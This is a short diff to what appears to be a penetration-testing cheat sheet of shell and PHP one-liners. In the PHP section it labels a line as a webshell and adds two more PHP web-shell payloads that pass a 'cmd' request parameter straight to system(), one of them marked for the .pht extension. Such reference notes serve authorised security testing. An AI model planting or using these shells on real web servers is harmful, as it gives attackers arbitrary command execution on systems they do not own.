@@ -3976,8 +3976,10 @@ cat strings_here.txt |perl -MDigest::MD5=md5_hex -nlE'say"".md5_hex($_)' > out
 # interactive mode
 php -a
 
-# define http request variables : parameter can be used in subsequent GET + POST requests
+# webshell - define http request variables : parameter can be used in subsequent GET + POST requests
 <?php system($_REQUEST['parameter_name_here']); ?>
+<?php system($_GET['cmd']); ?>
+<?= system($_GET['cmd']); ?> # .pht
 
 # HTTP server
 php -S 0.0.0.0:port_here
